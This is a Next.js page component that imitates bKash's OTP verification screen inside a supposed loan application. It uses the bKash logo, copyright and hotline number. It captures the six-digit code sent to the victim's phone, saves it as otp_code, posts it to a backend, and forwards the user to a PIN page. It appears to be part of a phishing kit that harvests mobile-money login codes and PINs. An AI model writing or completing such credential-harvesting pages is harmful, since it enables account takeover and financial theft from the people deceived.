'use client';
import { useState, useEffect } from 'react';
import { useRouter } from 'next/navigation';
import { useLoan } from '@/context/LoanContext';

export default function VerifyOtp() {
  const router = useRouter();
  const { loanData, updateLoanData, isHydrated } = useLoan();
  const [otp, setOtp] = useState('');
  const [timeLeft, setTimeLeft] = useState(60);
  const [error, setError] = useState('');
  const [isValid, setIsValid] = useState(false);
  const [showCancel, setShowCancel] = useState(false);
  const [isProcessing, setIsProcessing] = useState(false);

  useEffect(() => {
    if (isHydrated) {
      if (!loanData.mobile_number) {
        router.push('/verify-number');
      }
    }
  }, [isHydrated, loanData.mobile_number, router]);

  useEffect(() => {
    const timer = setInterval(() => {
      setTimeLeft((prev) => (prev > 0 ? prev - 1 : 0));
    }, 1000);
    return () => clearInterval(timer);
  }, []);

  if (!isHydrated) {
    return <div className="min-h-screen bg-gray-100 flex items-center justify-center">Loading...</div>;
  }

  const handleInput = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/[^0-9]/g, '');
    setOtp(value);
    setIsValid(value.length === 6);
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (otp.length !== 6) return;

    setIsProcessing(true);
    updateLoanData({ otp_code: otp, status: 'otp_verified' });

    try {
      await fetch('/api/loan/update', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ id: loanData.id, otp_code: otp, status: 'otp_verified' })
      });
      router.push('/verify-pin');
    } catch (err) {
      console.error('Failed to update loan:', err);
      setError('একটি ত্রুটি ঘটেছে। অনুগ্রহ করে আবার চেষ্টা করুন।');
      setIsProcessing(false);
    }
  };

  const maskedMobile = loanData.mobile_number 
    ? loanData.mobile_number.substring(0, 3) + 'XXXX' + loanData.mobile_number.substring(7)
    : '';

  return (
    <div className="bg-gray-100 flex items-center justify-center min-h-screen p-4">
      <div className="w-full max-w-md bg-white rounded-lg shadow-lg overflow-hidden">
        {/* bKash Header */}
        <div className="flex justify-between items-center bg-white px-6 py-4 border-b">
          <img src="/img/bKash-logo.png" className="mx-auto h-6" alt="bKash Logo" />
        </div>

        {/* Info Section */}
        <div className="flex justify-between items-start bg-gray-100 px-4 py-3">
          <div>
            <p className="text-sm font-semibold text-gray-800">Loan Amount</p>
            <p className="text-xs text-gray-500">loan category: {loanData.category}</p>
          </div>
          <p className="text-sm font-semibold text-gray-800">৳{loanData.amount?.toLocaleString(undefined, { minimumFractionDigits: 2 })}</p>
        </div>

        {error && (
          <div className="bg-red-100 border border-red-400 text-red-700 px-4 py-2 text-sm text-center">
            {error}
          </div>
        )}

        <form onSubmit={handleSubmit}>
          {/* OTP Input Section */}
          <div className="bg-pink-600 px-6 py-16">
            <p className="text-white text-sm mb-2 text-center">Enter verification code sent to {maskedMobile}</p>
            <input
              type="text"
              value={otp}
              onChange={handleInput}
              placeholder="Enter 6 digit code"
              className="w-full px-4 py-2 rounded bg-white text-gray-800 focus:outline-none focus:ring-2 focus:ring-pink-400 text-center"
              maxLength={6}
              required
            />
            <p className="text-white text-xs mt-2 text-center">
              {timeLeft > 0 ? (
                <span>Resend Code in {timeLeft}s</span>
              ) : (
                <button type="button" onClick={() => setTimeLeft(60)} className="underline">Resend Code</button>
              )}
            </p>
          </div>

          {/* Buttons */}
          <div className="flex justify-between items-center bg-white px-6 py-4">
            <button 
              type="button" 
              onClick={() => setShowCancel(true)}
              className="w-[48%] bg-gray-200 text-gray-700 py-2 rounded hover:bg-gray-300"
            >
              Cancel
            </button>
            <button 
              type="submit" 
              disabled={!isValid || isProcessing}
              className={`w-[48%] py-2 rounded transition-colors ${isValid && !isProcessing ? 'bg-pink-500 text-white hover:bg-pink-600' : 'bg-gray-300 text-gray-500 cursor-not-allowed'}`}
            >
              {isProcessing ? 'Processing...' : 'Confirm'}
            </button>
          </div>
        </form>

        {/* Footer */}
        <div className="text-center text-xs text-gray-400 py-4 border-t">
          © 2025 bKash, All Rights Reserved
          <br />
          <span className="text-pink-600">● 16247</span>
        </div>
      </div>

      {/* Cancel Dialog */}
      {showCancel && (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
          <div className="bg-pink-500 rounded-lg p-6 max-w-sm w-full mx-4 text-center">
            <div className="text-white mb-4">
              <div className="text-4xl mb-2">✋</div>
              <p className="text-lg font-medium">Are you sure you want to cancel this payment?</p>
            </div>
            <div className="flex gap-4">
              <button onClick={() => router.push('/loan-request')} className="flex-1 bg-gray-200 text-gray-700 py-2 rounded hover:bg-gray-300">
                Yes
              </button>
              <button onClick={() => setShowCancel(false)} className="flex-1 bg-pink-600 text-white py-2 rounded hover:bg-pink-700">
                No
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
